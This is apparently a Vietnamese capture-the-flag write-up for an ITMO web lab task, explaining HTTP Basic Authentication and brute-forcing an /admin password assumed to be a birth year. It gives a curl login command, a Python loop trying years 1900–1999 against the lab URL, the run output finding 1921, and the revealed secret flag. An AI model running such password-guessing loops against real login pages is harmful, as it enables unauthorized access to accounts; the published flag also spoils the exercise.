# Админ сайта (admin) установил пароль равный своему году рождения на страницу /admin. Сможете авторизоваться?
# Bài này yêu cầu bạn truy cập vào trang web có bảo mật bằng Basic Authentication. Thông tin bạn có là trang /admin được bảo vệ bằng mật khẩu, và mật khẩu chính là năm sinh của người quản trị trang web (admin).

# Basic Authentication là gì?
- Basic Authentication là một phương thức bảo mật đơn giản, trong đó khi bạn truy cập vào một trang yêu cầu đăng nhập, trình duyệt của bạn sẽ yêu cầu nhập tài khoản và mật khẩu. Sau đó, thông tin này sẽ được mã hóa (dưới dạng Base64) và gửi lên máy chủ để xác thực.

# Cách thực hiện

Khi truy cập vào đường dẫn: https://6bf7e033-4b12-456f-a1cb-3e6b70d58891-web.web.lms.itmo.xyz/admin, trình duyệt sẽ yêu cầu bạn nhập username và mật khẩu.
Username có thể là admin, mật khẩu bạn sẽ đoán là một trong các năm sinh như 1980, 1985, 1990, v.v.

Sử dụng cURL: Nếu bạn sử dụng terminal (Linux), bạn có thể dùng lệnh curl để thử đăng nhập.

```curl -u admin:1980 https://6bf7e033-4b12-456f-a1cb-3e6b70d58891-web.web.lms.itmo.xyz/admin```

Để dò mật khẩu tự động ta làm như sau:

*thay url bằng url của bạn:*

```python
import requests
from requests.auth import HTTPBasicAuth

url = 'https://6bf7e033-4b12-456f-a1cb-3e6b70d58891-web.web.lms.itmo.xyz/admin'

# Thử các năm từ 1900 đến 200
for year in range(1900, 2000):
    response = requests.get(url, auth=HTTPBasicAuth('admin', str(year)))
    if response.status_code == 200:
        print(f"Đăng nhập thành công với mật khẩu: {year}")
        break
    else:
        print(f"Thử {year}: không thành công")
```

**Kết quả:**

```bash
$ python3 Basic_Auth.py 
Thử 1900: không thành công
Thử 1901: không thành công
Thử 1902: không thành công
Thử 1903: không thành công
Thử 1904: không thành công
Thử 1905: không thành công
Thử 1906: không thành công
Thử 1907: không thành công
Thử 1908: không thành công
Thử 1909: không thành công
Thử 1910: không thành công
Thử 1911: không thành công
Thử 1912: không thành công
Thử 1913: không thành công
Thử 1914: không thành công
Thử 1915: không thành công
Thử 1916: không thành công
Thử 1917: không thành công
Thử 1918: không thành công
Thử 1919: không thành công
Thử 1920: không thành công
Đăng nhập thành công với mật khẩu: 1921
```

Sau đó đăng nhập bằng user name : addmin
password là năm sinh:

nó sẽ hiện ra như vậy: 
```bash
Hello, admin. Your secret data is 20e2d747c911e970c080fe1084d6315653cb2738041304c491c077f3055dcef63acabf31d753fd29623e799898b04a878f !
```
